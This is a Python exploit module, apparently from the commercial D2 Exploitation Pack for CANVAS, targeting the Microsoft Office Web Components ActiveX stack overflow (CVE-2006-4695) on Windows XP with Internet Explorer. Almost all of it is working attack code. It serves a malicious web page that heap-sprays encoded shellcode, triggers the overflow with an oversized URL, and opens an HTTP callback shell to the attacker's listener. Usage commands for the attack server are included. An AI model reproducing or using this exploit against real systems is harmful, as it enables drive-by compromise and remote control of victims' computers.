#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2008
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct

# GUI info
NAME = "Microsoft Office Web Components ActiveX Stack Overflow"

DESCRIPTION = "Stack Overflow Vulnerability in Microsoft Office Web Components ActiveX"
DOCUMENTATION = {}
DOCUMENTATION['Date public'] = "2008.03.11"
DOCUMENTATION['References'] = "http://www.securityfocus.com/bid/28135"
DOCUMENTATION['VersionsAffected'] = "Microsoft Office Web Components 2000"
DOCUMENTATION["CVE Name"] = "CVE-2006-4695"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4695"

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_ms08_017 -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP SP0-SP2 with IE'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        self.filename2 = "start.html"
        return
        
    def makefile(self):	
    	host = self.callback.ip
        port = self.callback.port
        
        filedata = """
<HTML>
  <HEAD>    
    <meta http-equiv="refresh" content="5; url=http://SERVERHOST/"/>
  </HEAD>

<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var detect = new ActiveXObject("OWC.Spreadsheet.9");
	
	if (detect) {	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:0002E510-0000-0000-C000-000000000046' id='target'></object>";
			
		var stackBuffer = "";
		var heapSprayToAddress = 0x20202020; 
		var payLoadCode = unescape('SHELLCODE'); 
		var heapBlockSize = 0x400000; 
		var payLoadSize = payLoadCode.length * 2; 
		var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
		var spraySlide = unescape("%u0c0c%u0c0c"); 
		spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
		heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
		memory = new Array(); 
		
		for (i=0;i<heapBlocks;i++) { 
			memory[i] = spraySlide + payLoadCode; 
		} 
		
		function getSpraySlide(spraySlide, spraySlideSize) {
			while (spraySlide.length*2<spraySlideSize) { 
				spraySlide += spraySlide; 
			} 
			
			spraySlide = spraySlide.substring(0,spraySlideSize/2); 
			return spraySlide; 
		} 
				
		target.CSVURL = "http://SERVERHOST/FILENAME";
		target.DataType = "CSV";
		
		try {
		target.LoadText("d2","<",0,">");
		}
		catch(e){}		
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""
	filedata = filedata.replace('SERVERHOST', host)
	filedata = filedata.replace('FILENAME', self.filename2)	
	filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))

	if self.useSSL:
        	filedata = filedata.replace('http:', 'https:')
			
        return filedata

    def makefile2(self):	
    	host = self.callback.ip
        port = self.callback.port

	block = "\x86" * 20746

        filedata = """
"http://SERVERHOST/BLOCK/../end.html";
"""
	filedata = filedata.replace('SERVERHOST', host)	
	filedata = filedata.replace('BLOCK', block)	
	
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
        elif clientheader.URL.count(self.filename2):          
            sploitstring = self.makefile2()            
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):                
        host = self.callback.ip
        port = self.callback.port

        httpWrapper = ''
        
        try:
            if self.HTTPMOSDEF:
                print "[!] using HTTP MOSDEF tunneling"
                print "callback: [%s:%d]\n" % (host, port)
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval":0x1000})                
                	
                if self.useSSL:
                    ssl = "s"
                else:
                    ssl = ""                
                    
                sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
                httpWrapper = sc.get()                
                print "[!] HTTP MOSDEF len: %d bytes" % (len(httpWrapper))
        except:
            httpWrapper = ""
            
        rawshellcode = self.createInjectToSelf(host, port, injectme = httpWrapper, movetostack = True)
        
        from encoder import addencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)

        self.shellcode = encoder.encode(rawshellcode)
        
        return self.shellcode

    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
